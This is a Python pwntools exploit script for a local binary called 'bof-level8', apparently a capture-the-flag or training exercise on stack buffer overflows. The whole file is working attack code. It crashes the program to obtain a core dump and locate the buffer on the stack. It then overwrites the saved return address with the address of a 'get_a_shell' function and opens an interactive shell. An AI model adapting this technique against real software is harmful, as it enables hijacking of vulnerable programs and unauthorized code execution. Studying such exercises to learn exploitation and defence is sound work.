#!/usr/bin/env python

from pwn import *
import os

env = {
    'ENVASDFGH' : 'aaaaaaaaaa'*20,
}

p = process('./bof-level8', env=env)

buf = 'A' * 0x80 + "\x00"

if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buf)
print(hex(buffer_addr))

e = ELF('./bof-level8')

gas_addr = e.symbols['get_a_shell']

buf = "AAAAAAAAAAAAAAAABBBBBBBB" + p64(gas_addr)

buf = buf + "C" * (0x80 - len(buf)) + "\x00"

p.sendline(buf)

p.interactive()
